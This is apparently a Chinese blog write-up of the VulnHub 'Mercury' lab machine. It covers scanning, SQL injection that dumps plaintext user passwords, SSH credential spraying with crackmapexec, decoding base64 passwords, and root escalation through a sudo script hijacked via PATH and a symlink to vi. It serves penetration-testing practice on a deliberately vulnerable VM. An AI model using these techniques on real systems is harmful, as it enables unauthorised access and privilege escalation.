+++
date = '2026-11-15T18:32:03+08:00'
draft = false
title = '[VulnHub靶机]Mercury渗透记录'
tags = ['渗透','Vulnhub','SQLi','Django']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 192.168.243.51  
靶机IP: 192.168.243.37

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.243.51
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.243.37  08:00:27:5a:38:64       PCS Systemtechnik GmbH
192.168.243.44  66:60:15:aa:44:28       (Unknown: locally administered)
192.168.243.202 d0:65:78:4c:15:bc       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.962 seconds (130.48 hosts/sec). 3 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.243.37                                 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-15 18:40 +0800
Nmap scan report for 192.168.243.37
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:5A:38:64 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
```

详细扫描, 注意到服务器是通过Python构建的, 有可能是Flask或Django, robots.txt中只有根目录

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ sudo nmap -sT -sV -sC -O -p22,8080 192.168.243.37                                 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-15 18:41 +0800
Nmap scan report for 192.168.243.37
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http    WSGIServer 0.2 (Python 3.8.2)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:5A:38:64 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (97%), Linux 6.0 (96%), Linux 4.19 (96%), Linux 5.0 - 5.14 (95%), Linux 5.4 - 5.10 (94%), Linux 2.6.32 (94%), Linux 4.15 (94%), Linux 5.14 - 6.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ sudo nmap --script=vuln -p22,8080 192.168.243.37
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-15 18:42 +0800
Nmap scan report for 192.168.243.37
Host is up (0.00039s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
| http-enum:
|_  /robots.txt: Robots file
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
MAC Address: 08:00:27:5A:38:64 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 522.13 seconds
```

## Web渗透

### 网站信息收集

访问8080端口, 只有一句话, 告诉我们这是一台开发服务器, 源代码中没有任何提示

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%AE%BF%E9%97%AE8080%E7%AB%AF%E5%8F%A3.avif)

目录爆破没有结果, 抱着试一试的心态访问/development, 结果发现居然出现了Django的错误页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/404%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2.avif)

现在我们知道了一个新目录mercuryfacts, 访问发现是一张水星图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%AE%BF%E9%97%AEmercuryfacts.avif)

点击See List, 阅读todo文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E6%9F%A5%E7%9C%8Btodo.avif)

得知以下重要信息:

1. 没有认证系统
2. 存在users表, 里面有用户信息
3. 目前实现直接请求数据库而没有使用Django的models, 很有可能存在SQL注入

### SQL注入

访问Load a fact, 返回了数据库信息, 注意URL中存在参数1

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%AE%BF%E9%97%AEfact.avif)

将1改为1 or 1, 发现返回了全部数据, 故存在SQL注入漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E5%8F%91%E7%8E%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.avif)

故意输入错误的SQL语法, 在错误信息中得到服务器使用的完整SQL语句

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E6%9F%A5%E7%9C%8B%E5%AE%8C%E6%95%B4SQL%E8%AF%AD%E5%8F%A5.avif)

```sql
SELECT fact FROM facts WHERE id = 1
```

使用猜测users表中存在username和password列, 尝试使用联合查询注入读取密码

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5dump%E5%87%AD%E6%8D%AE.avif)

现在我们得到4组凭据

| username | password |
| -------- | -------- |
| john | johnny1987 |
| laura | lovemykids111 |
| sam | lovemybeer111 |
| webmaster | mercuryisthesizeof0.056Earths |

使用crackmapexec尝试登录SSH, 发现一组有效凭据

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ crackmapexec ssh 192.168.243.37 -u username.list -p passwd.list --continue-on-success --no-bruteforce                 
SSH         192.168.243.37  22     192.168.243.37   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
SSH         192.168.243.37  22     192.168.243.37   [-] john:johnny1987 Authentication failed.
SSH         192.168.243.37  22     192.168.243.37   [-] laura:lovemykids111 Authentication failed.
SSH         192.168.243.37  22     192.168.243.37   [-] sam:lovemybeer111 Authentication failed.
SSH         192.168.243.37  22     192.168.243.37   [+] webmaster:mercuryisthesizeof0.056Earths
```

使用用户名`webmaster`, 密码`mercuryisthesizeof0.056Earths`登录SSH

```shell
┌──(kali㉿kali)-[~/Mercury]
└─$ ssh webmaster@192.168.243.37
The authenticity of host '192.168.243.37 (192.168.243.37)' can't be established.
ED25519 key fingerprint is: SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.243.37' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
webmaster@192.168.243.37's password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 15 Nov 11:31:56 UTC 2026

  System load:             0.0
  Usage of /:              74.6% of 4.86GB
  Memory usage:            30%
  Swap usage:              0%
  Processes:               106
  Users logged in:         0
  IPv4 address for enp0s3: 192.168.243.37
  IPv6 address for enp0s3: 240a:42d8:b400:4c60:a00:27ff:fe5a:3864


22 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136
webmaster@mercury:~$
```

## 权限提升

读取user_flag.txt

```shell
webmaster@mercury:~$ ls -lah
total 36K
drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 .
drwxr-xr-x 5 root      root      4.0K Aug 28  2020 ..
lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -> /dev/null
-rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout
-rw-r--r-- 1 webmaster webmaster 3.7K Aug 27  2020 .bashrc
drwx------ 2 webmaster webmaster 4.0K Aug 27  2020 .cache
drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 mercury_proj
-rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile
-rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor
-rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt
webmaster@mercury:~$ cat user_flag.txt 
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

在mercury_proj目录中发现notes.txt

```shell
webmaster@mercury:~/mercury_proj$ ls -lah                                          
total 28K                                                                          
drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 .
drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 ..
-rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3       
-rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py                       
drwxrwxr-x 6 webmaster webmaster 4.0K Sep  1  2020 mercury_facts
drwxrwxr-x 4 webmaster webmaster 4.0K Aug 28  2020 mercury_index                   
drwxrwxr-x 3 webmaster webmaster 4.0K Aug 28  2020 mercury_proj                    
-rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt                       
webmaster@mercury:~/mercury_proj$ cat notes.txt                                    
Project accounts (both restricted):      
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

base64解码得新的凭据`linuxmaster`:`mercurymeandiameteris4880km`  
查看passwd中所有具有bash环境的用户

```shell
webmaster@mercury:/etc/cron.d$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
mercury:x:1000:1000:mercury:/home/mercury:/bin/bash
webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash
linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash
```

登录切换`linuxmaster`用户

```shell
webmaster@mercury:/etc/cron.d$ su linuxmaster
Password: 
linuxmaster@mercury:/etc/cron.d$ sudo -l
[sudo] password for linuxmaster: 
Matching Defaults entries for linuxmaster on mercury:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

注意到可以以root权限执行`/usr/bin/check_syslog.sh`

```shell
linuxmaster@mercury:/usr/bin$ ls -ldh /usr/bin/check_syslog.sh
-rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh
linuxmaster@mercury:/usr/bin$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

该脚本的作用是使用tail显示最后十行系统日志, 我们没有写权限, 不能修改其内容, 但因为它没有使用绝对路径, 我们可以通过软链接+环境变量劫持利用

创建名为tail, 实际指向/bin/vi的软链接

```shell
linuxmaster@mercury:~$ ln -s /bin/vi ./tail
linuxmaster@mercury:~$ ls -ld tail
lrwxrwxrwx 1 linuxmaster linuxmaster 7 Nov 15 12:12 tail -> /bin/vi
```

在当前环境变量中的$PATH的头部追加当前路径, 这样就会首先从我们当前的路径中寻找tail

```shell
linuxmaster@mercury:~$ pwd
/home/linuxmaster
linuxmaster@mercury:~$ export PATH=/home/linuxmaster:$PATH
linuxmaster@mercury:~$ echo $PATH
/home/linuxmaster:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

sudo执行check_syslog.sh, 传入`--preserve-env`参数将当前的PATH环境变量传递给脚本, 成功进入vi界面

```shell
linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%BF%9B%E5%85%A5vi%E7%95%8C%E9%9D%A2.avif)

输入命令`:!bash`, 即可获得rootshell

```shell
root@mercury:/home/linuxmaster# whoami
root
```

读取root_flag

```shell
root@mercury:/home/linuxmaster# cd /root
root@mercury:~# ls -lah
total 56K
drwx------  5 root root 4.0K Nov 15 12:12 .
drwxr-xr-x 19 root root 4.0K Sep  1  2020 ..
-rw-------  1 root root 3.2K Sep  2  2020 .bash_history
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4.0K Aug 27  2020 .cache
-rw-------  1 root root   34 Sep  1  2020 .lesshst
drwxr-xr-x  3 root root 4.0K Aug 28  2020 .local
-rw-------  1 root root 3.6K Sep  1  2020 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root 1.2K Sep  2  2020 root_flag.txt
drwx------  2 root root 4.0K Aug 27  2020 .ssh
-rw-------  1 root root 9.2K Nov 15 12:12 .viminfo
root@mercury:~# cat root_flag.txt
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```
